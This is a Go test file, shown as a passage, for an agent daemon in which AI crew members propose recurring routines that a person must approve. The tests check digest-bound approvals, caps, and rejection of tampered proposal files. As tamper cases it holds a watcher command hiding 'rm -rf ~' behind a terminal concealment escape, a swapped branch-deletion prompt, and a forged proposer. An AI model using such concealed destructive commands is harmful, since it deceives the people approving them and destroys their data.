package workspace

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"terva.sh/terva/packages/agent/ctrlproto"
	"terva.sh/terva/packages/agent/talkoot"
	"terva.sh/terva/packages/agent/timers"
)

// routinesConfig writes the user configuration of a daemon whose owner
// turned routines on. An empty routines leaves the key out.
func routinesConfig(t *testing.T, routines string) {
	t.Helper()
	cfg := `{"talkoot_enabled": true}`
	if routines != "" {
		cfg = `{"talkoot_enabled": true, "talkoot_routines": ` + routines + `}`
	}
	if err := os.WriteFile(filepath.Join(os.Getenv("TERVA_HOME"), "config.json"), []byte(cfg), 0o600); err != nil {
		t.Fatal(err)
	}
}

// routineCrew is the crew talkoot on a daemon with this routines key, after
// one turn of helm's. So helm holds a seat, and its chain has a person at
// its root. It returns the daemon's directory too, for a restart.
func routineCrew(t *testing.T, routines string) (*Workspace, talkootSeat, *stepClock, string) {
	t.Helper()
	cwd := talkootHome(t)
	routinesConfig(t, routines)
	clock := &stepClock{now: time.Now()}
	w := wakeDaemon(t, cwd, clock, okProvider)
	if _, err := w.talkootCreate(t.Context(), "crew", crewText(cwd)); err != nil {
		t.Fatal(err)
	}
	return w, helmAfterOneTurn(t, w), clock, cwd
}

var ciTask = talkoot.RoutineAsk{Kind: talkoot.RoutineTask, Schedule: "every 15m", Prompt: "Check the CI run of each open pull request."}

func routineLines(t *testing.T) []talkoot.Line {
	t.Helper()
	return roomLines(t, "crew", func(l talkoot.Line) bool { return l.Type == talkoot.LineRoutine })
}

func routineTimers(w *Workspace) []timers.Info {
	var out []timers.Info
	if svc := w.Timers(); svc != nil {
		for _, ti := range svc.List() {
			if ti.Owner == routineTimerOwner {
				out = append(out, ti)
			}
		}
	}
	return out
}

func routinesView(t *testing.T, w *Workspace) *ctrlproto.TalkootRoutines {
	t.Helper()
	view, err := w.Talkoot(t.Context(), ctrlproto.TalkootRef{ID: "crew"})
	if err != nil {
		t.Fatal(err)
	}
	return view.Routines
}

// cardDigest is the digest that the card of the proposal pid shows now, or
// "" when no card of a routine waits under that id.
func cardDigest(t *testing.T, w *Workspace, pid string) string {
	t.Helper()
	for _, c := range inbox(t, w) {
		if c.ID == pid && c.Proposal != nil && c.Proposal.Routine != nil {
			return c.Proposal.Routine.Digest
		}
	}
	return ""
}

// decide decides the proposal pid as a person who reads its card first: an
// approval sends the digest that the card shows at that moment.
func decide(t *testing.T, w *Workspace, pid, decision string) (ctrlproto.TalkootProposal, error) {
	t.Helper()
	p := ctrlproto.TalkootDecideParams{ID: "crew", By: "sothr", Proposal: pid, Decision: decision}
	if decision == ctrlproto.TalkootDecisionApprove {
		p.Digest = cardDigest(t, w, pid)
	}
	return w.DecideTalkoot(t.Context(), p)
}

// approved asks for ask as helm and approves it, and returns the routine's id.
func approved(t *testing.T, w *Workspace, seat talkootSeat, ask talkoot.RoutineAsk) string {
	t.Helper()
	r, err := seat.ProposeRoutine(ask, "The person asked for a watch on CI.")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := decide(t, w, r.Proposal.ID, ctrlproto.TalkootDecisionApprove); err != nil {
		t.Fatal(err)
	}
	return r.Proposal.ID
}

func setRoutine(t *testing.T, w *Workspace, rid, action, reason string) (ctrlproto.TalkootRoutines, error) {
	t.Helper()
	return w.SetTalkootRoutine(t.Context(), ctrlproto.TalkootRoutineSetParams{ID: "crew", By: "sothr", Routine: rid, Action: action, Reason: reason})
}

// The whole path: a member asks, the ask waits as a card and stores nothing,
// and a person's approval stores the routine and sets its timer.
func TestAMemberAsksForARoutineAndAPersonApproves(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	ch, err := w.Subscribe(t.Context(), ctrlproto.TalkootAddr("crew"))
	if err != nil {
		t.Fatal(err)
	}
	r, err := seat.ProposeRoutine(ciTask, "The person asked for a watch on CI.")
	if err != nil {
		t.Fatal(err)
	}
	if r.Schedule != "every 15m" || len(r.Diffs) != 0 || r.Proposal.Proposer != "helm" || r.Proposal.Status != talkoot.ProposalPending {
		t.Fatalf("receipt: %+v", r)
	}
	pid := r.Proposal.ID

	// 🚨 An ask is no routine. Nothing is stored and no timer is set until a
	// person approves the card.
	if n := len(routineTimers(w)); n != 0 {
		t.Fatalf("an ask must set no timer, got %d", n)
	}
	if v := routinesView(t, w); v == nil || !v.On || v.Max != 3 || len(v.Routines) != 0 {
		t.Fatalf("the view must say that routines are on, with the cap and no routine: %+v", v)
	}
	if n := len(routineLines(t)); n != 0 {
		t.Fatalf("an ask must write no routine line, got %d", n)
	}
	cards := inbox(t, w)
	if len(cards) != 1 || cards[0].Kind != ctrlproto.TalkootCardProposal || cards[0].ID != pid || cards[0].Member != "helm" {
		t.Fatalf("the ask must wait in the inbox as one card: %+v", cards)
	}
	p := cards[0].Proposal
	if p == nil || p.Routine == nil || p.Routine.Kind != "task" || p.Routine.Schedule != "every 15m" || p.Routine.Prompt != ciTask.Prompt ||
		p.Why != "The person asked for a watch on CI." || p.Class != string(talkoot.ClassAuthority) {
		t.Fatalf("the card must show the kind, the schedule, the prompt and the reason: %+v", p)
	}
	if !strings.Contains(p.Title, "helm asks for a task routine, every 15m") {
		t.Errorf("title: %q", p.Title)
	}
	if ev := nextEvent(t, ch, ctrlproto.EventTalkootInbox); ev.Talkoot.Card == nil || ev.Talkoot.Card.ID != pid {
		t.Errorf("the ask must reach a client as an inbox event: %+v", ev.Talkoot)
	}

	got, err := decide(t, w, pid, ctrlproto.TalkootDecisionApprove)
	if err != nil {
		t.Fatal(err)
	}
	if got.Status != talkoot.ProposalApproved || got.DecidedBy != "human:sothr" {
		t.Fatalf("decision: %+v", got)
	}
	if len(inbox(t, w)) != 0 {
		t.Error("an approved card must leave the inbox")
	}
	ts := routineTimers(w)
	if len(ts) != 1 || ts[0].ID != pid || !ts[0].Schedule.Recurs() || ts[0].Schedule.String() != "every 15m" || ts[0].Next.IsZero() {
		t.Fatalf("the approval must set one timer that recurs, with the routine's id: %+v", ts)
	}
	v := routinesView(t, w)
	if v == nil || len(v.Routines) != 1 {
		t.Fatalf("the view must list the routine: %+v", v)
	}
	rt := v.Routines[0]
	if rt.ID != pid || rt.Member != "helm" || rt.Kind != "task" || rt.Status != talkoot.RoutineActive || rt.ApprovedBy != "human:sothr" ||
		rt.Prompt != ciTask.Prompt || !rt.Next.Equal(ts[0].Next) {
		t.Fatalf("routine in the view: %+v", rt)
	}
	ls := routineLines(t)
	if len(ls) != 1 || ls[0].Action != talkoot.RoutineApproved || ls[0].By != "human:sothr" || ls[0].Ref != pid ||
		ls[0].Member != "helm" || ls[0].Proposal != pid || ls[0].Routine == nil || ls[0].Routine.Schedule != "every 15m" {
		t.Fatalf("the room must record the approval with the routine: %+v", ls)
	}
	if ev := nextEvent(t, ch, ctrlproto.EventTalkootRoutine); ev.Talkoot.Line == nil || ev.Talkoot.Line.Ref != pid || ev.Talkoot.Line.Routine == nil {
		t.Errorf("the approval must reach a client as a routine event: %+v", ev.Talkoot)
	}
	// A second approval of the same card stores no second routine.
	if _, err := decide(t, w, pid, ctrlproto.TalkootDecisionApprove); err == nil {
		t.Error("an approved card was approved again")
	}
	if n := len(routineTimers(w)); n != 1 {
		t.Errorf("got %d timers after a second approval", n)
	}
}

// 🚨 The tool is the way to ask, so it exists only where a person turned
// routines on. A daemon with no key gives its members no such tool.
func TestAMemberHasNoRoutineToolUnlessThePersonTurnedRoutinesOn(t *testing.T) {
	for _, tc := range []struct {
		name, routines string
		want           bool
	}{
		{"no key", "", false},
		{"a cap of zero", `{"max": 0}`, false},
		{"a kind the daemon does not know", `{"max": 2, "kinds": {"cron": {}}}`, false},
		{"on", `{"max": 1}`, true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w, seat, _, _ := routineCrew(t, tc.routines)
			s, err := w.resolve(memberView(t, w, "crew", "helm").Session)
			if err != nil {
				t.Fatal(err)
			}
			if _, ok := s.agent.LookupTool("talkoot_send"); !ok {
				t.Fatal("the positive control: helm has no talkoot_send")
			}
			if _, ok := s.agent.LookupTool("talkoot_routine"); ok != tc.want {
				t.Errorf("talkoot_routine present = %v, want %v", ok, tc.want)
			}
			// The seat refuses too, for a session that kept an older tool.
			_, err = seat.ProposeRoutine(ciTask, "Watch CI.")
			if tc.want && err != nil {
				t.Errorf("an ask on a daemon with routines on was refused: %v", err)
			}
			if !tc.want && (err == nil || !strings.Contains(err.Error(), "routines are off") || !strings.Contains(err.Error(), "talkoot_routines")) {
				t.Errorf("the seat must say that routines are off and name the key, got %v", err)
			}
			v := routinesView(t, w)
			switch {
			case tc.routines == "" && v != nil:
				t.Errorf("a daemon with no key shows no routine state, got %+v", v)
			case tc.routines != "" && (v == nil || v.On != tc.want):
				t.Errorf("the view must say whether routines are on: %+v", v)
			case tc.routines != "" && !tc.want && v.Problem == "":
				t.Error("a key that turns nothing on must say why in the view")
			}
		})
	}
}

// 🚨 The card hides a limit that matches the default of its kind, so a
// default is authority that nobody reads at the approval. The room's line
// therefore holds the value of every limit, the hidden ones included.
func TestTheCardShowsOnlyTheLimitsThatDifferAndTheRoomRecordsAll(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3, "kinds": {"task": {"follow_ups": 7, "reviews_per_day": 4}}}`)
	ask := ciTask
	spend, days, same := 25.0, 14, 7
	ask.SpendUSDPerDay, ask.EndAfterDays, ask.FollowUps = &spend, &days, &same
	r, err := seat.ProposeRoutine(ask, "The work needs a larger budget for two weeks.")
	if err != nil {
		t.Fatal(err)
	}
	card := inbox(t, w)[0].Proposal.Routine
	shown := map[string]ctrlproto.TalkootRoutineDiff{}
	for _, d := range card.Differs {
		shown[d.Field] = d
	}
	if len(shown) != 2 || shown[talkoot.FieldSpendUSDPerDay] != (ctrlproto.TalkootRoutineDiff{Field: talkoot.FieldSpendUSDPerDay, Value: "25.00", Default: "5.00"}) ||
		shown[talkoot.FieldEndAfterDays].Value != "14" {
		t.Fatalf("the card must show the two limits that differ, each beside its default: %+v", card.Differs)
	}
	if len(r.Diffs) != 2 {
		t.Errorf("the member is told the same two limits: %+v", r.Diffs)
	}
	if _, err := decide(t, w, r.Proposal.ID, ctrlproto.TalkootDecisionApprove); err != nil {
		t.Fatal(err)
	}
	ls := routineLines(t)
	if len(ls) != 1 || ls[0].Routine == nil {
		t.Fatalf("lines: %+v", ls)
	}
	want := talkoot.RoutineFields{EndAfterDays: 14, SpendUSDPerDay: 25, ReviewsPerDay: 4, FollowUps: 7, CatchUp: true}
	if got := ls[0].Routine.Fields; got != want {
		t.Fatalf("the room must hold every limit, the person's defaults included: got %+v, want %+v", got, want)
	}
	if ls[0].Routine.EndsAt.IsZero() {
		t.Error("the room must hold the date that the end gives")
	}
	// The line's own bytes hold a zero limit too.
	raw, err := json.Marshal(ls[0].Routine)
	if err != nil || !strings.Contains(string(raw), `"end_after_runs":0`) {
		t.Errorf("a limit of zero must still be written: %s (%v)", raw, err)
	}
	if got := routinesView(t, w).Routines[0].Fields; got.ReviewsPerDay != 4 || got.FollowUps != 7 || got.SpendUSDPerDay != 25 {
		t.Errorf("the view shows every limit of a stored routine: %+v", got)
	}
}

func TestAWatchersCardShowsItsCommandAsWritten(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	cmd := "tea pulls ls --state open \\\n\t--output simple"
	r, err := seat.ProposeRoutine(talkoot.RoutineAsk{Kind: talkoot.RoutineWatcher, Schedule: "Every  5m", Command: cmd}, "Watch the queue.")
	if err != nil {
		t.Fatal(err)
	}
	card := inbox(t, w)[0].Proposal.Routine
	if card.Kind != "watcher" || card.Command != cmd || card.Prompt != "" || card.Schedule != "every 5m" {
		t.Fatalf("the card must show the command byte for byte, and the schedule as the timer reads it: %+v", card)
	}
	if r.Schedule != "every 5m" {
		t.Errorf("the member is told the schedule as the timer reads it, got %q", r.Schedule)
	}
}

// A routine recurs. One later turn is a wake, and the refusal says so.
func TestARoutineNeedsAScheduleThatRecurs(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	for schedule, want := range map[string]string{
		"in 20m":           "set a wake",
		"every 10s":        "",
		"whenever":         "",
		"daily 25:00":      "",
		"every 15m always": "",
	} {
		ask := ciTask
		ask.Schedule = schedule
		_, err := seat.ProposeRoutine(ask, "Watch CI.")
		if err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%q must be refused with %q, got %v", schedule, want, err)
		}
	}
	if n := len(inbox(t, w)); n != 0 {
		t.Errorf("a refused ask must make no card, got %d", n)
	}
}

func TestADeclineStoresNoRoutine(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	r, err := seat.ProposeRoutine(ciTask, "Watch CI.")
	if err != nil {
		t.Fatal(err)
	}
	got, err := w.DecideTalkoot(t.Context(), ctrlproto.TalkootDecideParams{ID: "crew", By: "sothr", Proposal: r.Proposal.ID, Decision: ctrlproto.TalkootDecisionDecline, Reason: "Not yet."})
	if err != nil {
		t.Fatal(err)
	}
	if got.Status != talkoot.ProposalDeclined || got.Reason != "Not yet." {
		t.Fatalf("decision: %+v", got)
	}
	if len(routineTimers(w)) != 0 || len(routineLines(t)) != 0 || len(routinesView(t, w).Routines) != 0 || len(inbox(t, w)) != 0 {
		t.Fatal("a declined ask must store nothing, set no timer, and leave the inbox")
	}
	// The member may ask again after the decision.
	if _, err := seat.ProposeRoutine(ciTask, "Watch CI, as you now asked."); err != nil {
		t.Errorf("an ask after a decline was refused: %v", err)
	}
}

// One ask of a member waits at a time, so a member in a loop cannot fill the
// inbox with the same card.
func TestAMemberHasOneRoutineAskAtATime(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	first, err := seat.ProposeRoutine(ciTask, "Watch CI.")
	if err != nil {
		t.Fatal(err)
	}
	_, err = seat.ProposeRoutine(ciTask, "Watch CI.")
	if err == nil || !strings.Contains(err.Error(), first.Proposal.ID) || !strings.Contains(err.Error(), "still waits") {
		t.Fatalf("a second ask must be refused and name the one that waits, got %v", err)
	}
	if n := len(inbox(t, w)); n != 1 {
		t.Errorf("got %d cards", n)
	}
}

// 🚨 The cap holds at the ask and again at the approval. A card can wait
// while the person lowers the cap, or while another card is approved.
func TestARoutinePastTheCapIsRefusedWithTheCapNamed(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 2}`)
	approved(t, w, seat, ciTask)
	waiting, err := seat.ProposeRoutine(ciTask, "A second watch.")
	if err != nil {
		t.Fatal(err)
	}
	// The person lowers the cap while the second card waits.
	routinesConfig(t, `{"max": 1}`)
	_, err = decide(t, w, waiting.Proposal.ID, ctrlproto.TalkootDecisionApprove)
	if err == nil || !strings.Contains(err.Error(), "the limit is 1") || !strings.Contains(err.Error(), "talkoot_routines.max") {
		t.Fatalf("an approval past the cap must be refused with the cap and its key, got %v", err)
	}
	cards := inbox(t, w)
	if len(cards) != 1 || !strings.Contains(cards[0].Proposal.Problem, "talkoot_routines.max") || cards[0].Proposal.Status != talkoot.ProposalPending {
		t.Fatalf("the card must stay, with the reason on it: %+v", cards)
	}
	if len(routineTimers(w)) != 1 || len(routinesView(t, w).Routines) != 1 {
		t.Fatal("a refused approval must store no routine and set no timer")
	}
	if _, err := decide(t, w, waiting.Proposal.ID, ctrlproto.TalkootDecisionDecline); err != nil {
		t.Fatal(err)
	}
	// And the ask itself is refused at the cap.
	_, err = seat.ProposeRoutine(ciTask, "A third watch.")
	if err == nil || !strings.Contains(err.Error(), "the limit is 1") || !strings.Contains(err.Error(), "talkoot_routines.max") {
		t.Fatalf("an ask at the cap must be refused with the cap and its key, got %v", err)
	}
}

// 🚨 A card can wait for days. A person who turned routines off since must
// not store one by approving an old card.
func TestAnApprovalAfterRoutinesWereTurnedOffIsRefused(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	r, err := seat.ProposeRoutine(ciTask, "Watch CI.")
	if err != nil {
		t.Fatal(err)
	}
	routinesConfig(t, "")
	_, err = decide(t, w, r.Proposal.ID, ctrlproto.TalkootDecisionApprove)
	if err == nil || !strings.Contains(err.Error(), "routines are off") {
		t.Fatalf("want a refusal that says routines are off, got %v", err)
	}
	if len(routineTimers(w)) != 0 || len(routineLines(t)) != 0 {
		t.Fatal("a refused approval must store nothing")
	}
	if cards := inbox(t, w); len(cards) != 1 || !strings.Contains(cards[0].Proposal.Problem, "routines are off") {
		t.Fatalf("the card must stay, with the reason on it: %+v", cards)
	}
	// Turned on again, the same card is approved.
	routinesConfig(t, `{"max": 3}`)
	if _, err := decide(t, w, r.Proposal.ID, ctrlproto.TalkootDecisionApprove); err != nil {
		t.Fatalf("the card must be good again once routines are on: %v", err)
	}
	if len(routineTimers(w)) != 1 {
		t.Error("the approval set no timer")
	}
}

// 🚨 An approval is for the card that the person read. The proposal is a
// file, and so are the defaults. A change to either between the read and the
// decision must not be stored under the person's name.
func TestAnApprovalIsForTheCardThatThePersonRead(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	r, err := seat.ProposeRoutine(ciTask, "Watch CI.")
	if err != nil {
		t.Fatal(err)
	}
	pid := r.Proposal.ID
	read := cardDigest(t, w, pid)
	if !strings.HasPrefix(read, "sha256:") {
		t.Fatalf("the card must carry a digest of what it shows, got %q", read)
	}
	approve := func(digest string) error {
		_, err := w.DecideTalkoot(t.Context(), ctrlproto.TalkootDecideParams{ID: "crew", By: "sothr", Proposal: pid, Decision: ctrlproto.TalkootDecisionApprove, Digest: digest})
		return err
	}
	stored := func() bool {
		return len(routineTimers(w)) != 0 || len(routineLines(t)) != 0 || len(routinesView(t, w).Routines) != 0
	}
	refusedAs := func(what string, err error) {
		t.Helper()
		if err == nil || !strings.Contains(err.Error(), "not what the card showed") {
			t.Fatalf("%s: want a refusal that says the card changed, got %v", what, err)
		}
		if stored() {
			t.Fatalf("%s: a refused approval stored a routine", what)
		}
	}
	refusedAs("an approval with no digest", approve(""))

	// The prompt changes on disk after the person read the card. The new
	// prompt is one that every check accepts.
	dir := filepath.Join(talkoot.Dir(), "crew")
	p, err := talkoot.LoadProposal(dir, pid)
	if err != nil {
		t.Fatal(err)
	}
	p.Routine.Prompt = "Delete every branch that has no open pull request."
	if err := talkoot.SaveProposal(dir, p); err != nil {
		t.Fatal(err)
	}
	refusedAs("an approval after the prompt changed", approve(read))
	swapped := cardDigest(t, w, pid)
	if swapped == read {
		t.Fatal("the digest must change with the prompt")
	}
	if cards := inbox(t, w); len(cards) != 1 || !strings.Contains(cards[0].Proposal.Problem, "not what the card showed") {
		t.Fatalf("the card must stay, with the reason on it: %+v", cards)
	}

	// A default changes after the person read the card. The card hid that
	// limit, so the digest is the only thing that says it moved.
	routinesConfig(t, `{"max": 3, "kinds": {"task": {"follow_ups": 50}}}`)
	refusedAs("an approval after a default changed", approve(swapped))
	if now := cardDigest(t, w, pid); now == swapped {
		t.Fatal("the digest must change with a default that the card hides")
	} else if err := approve(now); err != nil {
		t.Fatalf("the card as it is now must be approved: %v", err)
	}
	if got := routinesView(t, w).Routines; len(got) != 1 || got[0].Fields.FollowUps != 50 || got[0].Prompt != p.Routine.Prompt {
		t.Fatalf("the routine must be the one on the card that was approved: %+v", got)
	}
}

// 🚨 While routines are off the daemon holds no defaults. A card that
// compared the ask with zeros would show a default of 0 for each limit, and
// would list a limit that the member never set.
func TestACardShowsNoDefaultWhileRoutinesAreOff(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	ask := ciTask
	spend := 25.0
	ask.SpendUSDPerDay = &spend
	if _, err := seat.ProposeRoutine(ask, "Watch CI."); err != nil {
		t.Fatal(err)
	}
	on := inbox(t, w)[0].Proposal.Routine
	if on.DefaultsUnknown || on.Fields == nil || on.Fields.FollowUps != 2 || len(on.Differs) != 1 || on.Differs[0].Default != "5.00" {
		t.Fatalf("with routines on, the card compares the ask with the defaults: %+v", on)
	}
	routinesConfig(t, "")
	off := inbox(t, w)[0].Proposal.Routine
	if !off.DefaultsUnknown || off.Fields != nil {
		t.Fatalf("with routines off, the card must say that the defaults are not known, and hold no limits: %+v", off)
	}
	if len(off.Differs) != 1 || off.Differs[0] != (ctrlproto.TalkootRoutineDiff{Field: talkoot.FieldSpendUSDPerDay, Value: "25.00"}) {
		t.Fatalf("the card must list the one limit that the member set, with no default beside it: %+v", off.Differs)
	}
}

// 🚨 The proposal's record is a file, so it can change after the ask was
// checked. An approval checks what the file holds now.
func TestAnApprovalChecksTheRecordAgain(t *testing.T) {
	for name, tc := range map[string]struct {
		edit func(*talkoot.Proposal)
		want string
	}{
		"a proposer that is no member":       {func(p *talkoot.Proposal) { p.Proposer = "human:mallory" }, "a member asks for a routine"},
		"a member that is not on the roster": {func(p *talkoot.Proposal) { p.Proposer = "ghost" }, "left the roster"},
		"a schedule that is one time":        {func(p *talkoot.Proposal) { p.Routine.Schedule = "in 5m" }, "a routine recurs"},
		"a kind the daemon does not know":    {func(p *talkoot.Proposal) { p.Routine.Kind = "cron" }, "must be one of"},
		"a watcher with a hidden command": {func(p *talkoot.Proposal) {
			p.Routine.Kind, p.Routine.Prompt, p.Routine.Command = "watcher", "", "ls \x1b[8mrm -rf ~"
		}, "control character"},
		"a limit below zero": {func(p *talkoot.Proposal) { n := -1; p.Routine.FollowUps = &n }, "follow_ups is -1"},
	} {
		t.Run(name, func(t *testing.T) {
			w, seat, _, _ := routineCrew(t, `{"max": 3}`)
			r, err := seat.ProposeRoutine(ciTask, "Watch CI.")
			if err != nil {
				t.Fatal(err)
			}
			dir := filepath.Join(talkoot.Dir(), "crew")
			p, err := talkoot.LoadProposal(dir, r.Proposal.ID)
			if err != nil {
				t.Fatal(err)
			}
			tc.edit(&p)
			if err := talkoot.SaveProposal(dir, p); err != nil {
				t.Fatal(err)
			}
			_, err = decide(t, w, p.ID, ctrlproto.TalkootDecisionApprove)
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("want a refusal that holds %q, got %v", tc.want, err)
			}
			if len(routineTimers(w)) != 0 || len(routineLines(t)) != 0 || len(routinesView(t, w).Routines) != 0 {
				t.Fatal("a refused approval must store nothing")
			}
		})
	}
}

// A routine's card takes no edit, and an approved routine has no undo. A
// person declines the one and deletes the other.
func TestARoutineCardTakesNoEditAndNoUndo(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	r, err := seat.ProposeRoutine(ciTask, "Watch CI.")
	if err != nil {
		t.Fatal(err)
	}
	_, err = w.DecideTalkoot(t.Context(), ctrlproto.TalkootDecideParams{ID: "crew", By: "sothr", Proposal: r.Proposal.ID, Decision: ctrlproto.TalkootDecisionApprove,
		Ops: []ctrlproto.TalkootOp{{Op: talkoot.OpEdit, Member: "jev", Set: map[string]any{"posture": "yolo"}}}})
	if err == nil || !strings.Contains(err.Error(), "no edited operations") {
		t.Fatalf("an approval with operations must be refused, got %v", err)
	}
	if got := readFile(t, filepath.Join(talkoot.Dir(), "crew", talkoot.FileName)); strings.Contains(string(got), "yolo") {
		t.Fatal("the operations beside a routine's approval changed the roster")
	}
	if cards := inbox(t, w); len(cards) != 1 || cards[0].Proposal.Problem != "" {
		t.Errorf("the person's own mistake puts no problem on the card: %+v", cards)
	}
	if _, err := decide(t, w, r.Proposal.ID, ctrlproto.TalkootDecisionApprove); err != nil {
		t.Fatal(err)
	}
	_, err = w.ProposeTalkoot(t.Context(), ctrlproto.TalkootProposeParams{ID: "crew", By: "sothr", Undo: r.Proposal.ID})
	if err == nil || !strings.Contains(err.Error(), "deletes a routine from its list") {
		t.Fatalf("an undo of a routine's proposal must say how to remove a routine, got %v", err)
	}
}

func TestAPersonPausesResumesAndDeletesARoutine(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	rid := approved(t, w, seat, ciTask)

	got, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutinePause, "Too noisy this week.")
	if err != nil {
		t.Fatal(err)
	}
	if len(got.Routines) != 1 || got.Routines[0].Status != talkoot.RoutinePaused || got.Routines[0].Reason != "Too noisy this week." ||
		got.Routines[0].ChangedBy != "human:sothr" || !got.Routines[0].Next.IsZero() || got.Routines[0].Problem != "" {
		t.Fatalf("a paused routine: %+v", got.Routines)
	}
	if n := len(routineTimers(w)); n != 0 {
		t.Fatalf("a pause must remove the timer, got %d", n)
	}
	ls := routineLines(t)
	if len(ls) != 2 || ls[1].Action != talkoot.ActionPaused || ls[1].By != "human:sothr" || ls[1].Ref != rid || ls[1].Reason != "Too noisy this week." || ls[1].Routine != nil {
		t.Fatalf("the room must record the pause, the person and the reason: %+v", ls)
	}
	// A second pause changes nothing and writes no second line.
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutinePause, ""); err != nil {
		t.Fatal(err)
	}
	if n := len(routineLines(t)); n != 2 {
		t.Errorf("a second pause wrote a line: %d lines", n)
	}

	got, err = setRoutine(t, w, rid, ctrlproto.TalkootRoutineResume, "")
	if err != nil {
		t.Fatal(err)
	}
	if got.Routines[0].Status != talkoot.RoutineActive || got.Routines[0].Next.IsZero() {
		t.Fatalf("a resumed routine: %+v", got.Routines)
	}
	if ts := routineTimers(w); len(ts) != 1 || ts[0].ID != rid || ts[0].Schedule.String() != "every 15m" {
		t.Fatalf("a resume must set the timer again: %+v", ts)
	}
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineResume, ""); err == nil {
		t.Error("an active routine was resumed")
	}
	if ls := routineLines(t); len(ls) != 3 || ls[2].Action != talkoot.RoutineResumed {
		t.Fatalf("lines: %+v", ls)
	}

	got, err = setRoutine(t, w, rid, ctrlproto.TalkootRoutineDelete, "The work is done.")
	if err != nil {
		t.Fatal(err)
	}
	if len(got.Routines) != 0 || len(routineTimers(w)) != 0 {
		t.Fatalf("a delete must remove the routine and its timer: %+v", got)
	}
	if ls := routineLines(t); len(ls) != 4 || ls[3].Action != talkoot.RoutineDeleted || ls[3].Reason != "The work is done." || ls[3].Member != "helm" {
		t.Fatalf("lines: %+v", ls)
	}
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineDelete, ""); talkootCode(err) != ctrlproto.CodeNotFound {
		t.Errorf("a second delete: %v", err)
	}
	// The delete frees a place under the cap.
	if _, err := seat.ProposeRoutine(ciTask, "Watch CI again."); err != nil {
		t.Errorf("an ask after a delete was refused: %v", err)
	}
}

func TestARoutineVerbRefusesABadCall(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	rid := approved(t, w, seat, ciTask)
	ctx := t.Context()
	for name, p := range map[string]ctrlproto.TalkootRoutineSetParams{
		"an unknown action":           {ID: "crew", By: "sothr", Routine: rid, Action: "run"},
		"no valid person":             {ID: "crew", By: "not a name!", Routine: rid, Action: ctrlproto.TalkootRoutinePause},
		"a reason of two lines":       {ID: "crew", By: "sothr", Routine: rid, Action: ctrlproto.TalkootRoutinePause, Reason: "one\ntwo"},
		"an id outside the directory": {ID: "crew", By: "sothr", Routine: "../talkoot", Action: ctrlproto.TalkootRoutineDelete},
	} {
		if _, err := w.SetTalkootRoutine(ctx, p); err == nil {
			t.Errorf("%s must be refused", name)
		}
	}
	if v := routinesView(t, w); len(v.Routines) != 1 || v.Routines[0].Status != talkoot.RoutineActive || len(routineTimers(w)) != 1 || len(routineLines(t)) != 1 {
		t.Fatalf("a refused call must change nothing: %+v", v)
	}
	if _, err := w.SetTalkootRoutine(ctx, ctrlproto.TalkootRoutineSetParams{ID: "crew", By: "sothr", Routine: "01M7PKC0WGT5EWK907XY3CB20Y", Action: ctrlproto.TalkootRoutinePause}); talkootCode(err) != ctrlproto.CodeNotFound {
		t.Errorf("an id that names no routine: %v", err)
	}
}

// 🚨 A resume sets a timer, so it reads the policy as an approval does.
func TestAResumeIsRefusedWhileRoutinesAreOff(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	rid := approved(t, w, seat, ciTask)
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutinePause, ""); err != nil {
		t.Fatal(err)
	}
	routinesConfig(t, "")
	_, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineResume, "")
	if err == nil || !strings.Contains(err.Error(), "routines are off") {
		t.Fatalf("want a refusal that says routines are off, got %v", err)
	}
	if len(routineTimers(w)) != 0 {
		t.Fatal("a refused resume set a timer")
	}
	// A daemon with the key gone still shows the routine, and still lets a
	// person delete it.
	v := routinesView(t, w)
	if v == nil || v.On || len(v.Routines) != 1 || v.Routines[0].Status != talkoot.RoutinePaused {
		t.Fatalf("the view must keep a routine that exists, with routines off: %+v", v)
	}
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineDelete, ""); err != nil {
		t.Errorf("a delete with routines off: %v", err)
	}
}

// A routine with an end does not resume after it.
func TestARoutineDoesNotResumeAfterItsEnd(t *testing.T) {
	w, seat, _, _ := routineCrew(t, `{"max": 3}`)
	ask := ciTask
	days := 1
	ask.EndAfterDays = &days
	rid := approved(t, w, seat, ask)
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutinePause, ""); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(talkoot.Dir(), "crew")
	r, err := talkoot.LoadRoutine(dir, rid)
	if err != nil {
		t.Fatal(err)
	}
	if r.EndsAt.IsZero() {
		t.Fatal("the routine has no end, so this test proves nothing")
	}
	r.EndsAt = time.Now().Add(-time.Hour)
	if err := talkoot.SaveRoutine(dir, r); err != nil {
		t.Fatal(err)
	}
	if _, err := setRoutine(t, w, rid, ctrlproto.TalkootRoutineResume, ""); err == nil || !strings.Contains(err.Error(), "ended on") {
		t.Fatalf("want a refusal that names the end, got %v", err)
	}
	if len(routineTimers(w)) != 0 {
		t.Fatal("a refused resume set a timer")
	}
}

// blockRoom makes every write to the crew's room fail, for a daemon that
